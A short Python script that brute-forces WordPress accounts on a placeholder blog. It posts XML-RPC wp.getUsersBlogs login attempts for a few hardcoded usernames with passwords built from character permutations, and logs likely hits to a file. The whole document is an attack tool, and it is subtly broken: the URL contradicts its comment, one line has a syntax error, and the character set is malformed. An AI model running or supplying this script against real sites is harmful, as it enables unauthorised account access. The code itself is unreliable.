import requests
import re
from more_itertools import distinct_permutations as idp

#list of usernames to test
usernames = ["brian","hector","test"]

# URL of the xmlrpc.php file
url = "http://www.target-blog.com/wp-json/wp/v2/users"

def post_request_to_check_password(password):


    headers = {
        "Content-Type": "text/xml",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    for ii in range(len(usernames)):
        
        response = requests.post(url, headers=headers, data=f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{usernames[ii]}</value></param><param><value>{password}</value></param></params></methodCall>")

        
        print("Here is",re.findall("Incorrect username or password.",str(response.content)))

        if(re.findall("Incorrect username or password.",str(response.content))):
            print("This is the wrong password")
            print(f"{usernames[ii]} with {password} is not good")
            success = "FAILED"
        else:
            print("This might be the good password")
            success = "PASSED"
            message = f"USER: '{usernames[ii]}' with PASS: '{password}' might be good"
            print(message)

            with open("password_success.txt","a") as file:
                file.write(message+"\n")
                
            return message]

    

counter=0
for p in idp('abcdefghghijklmnopqrstuvwxyzABCBEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+-=?><.,;:}[}]',20):
    password = ''.join(p)
    counter=counter+1
    print(password,":",counter)
    print(post_request_to_check_password(password))
    
    

    


